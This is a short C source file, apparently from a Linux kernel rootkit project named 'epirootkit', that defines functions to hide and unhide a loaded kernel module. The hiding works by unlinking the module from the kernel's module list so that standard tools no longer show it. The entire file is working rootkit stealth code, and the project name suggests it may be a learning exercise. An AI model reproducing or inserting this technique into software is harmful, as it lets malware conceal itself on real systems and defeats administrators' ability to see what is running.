#include "epirootkit.h"

static struct list_head *prev_module;

// Function prototypes
int hide_module(void);
int unhide_module(void);

int hide_module(void){
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
	return SUCCESS;
}

int unhide_module(void){
    list_add(&THIS_MODULE->list, prev_module);
	return SUCCESS;
}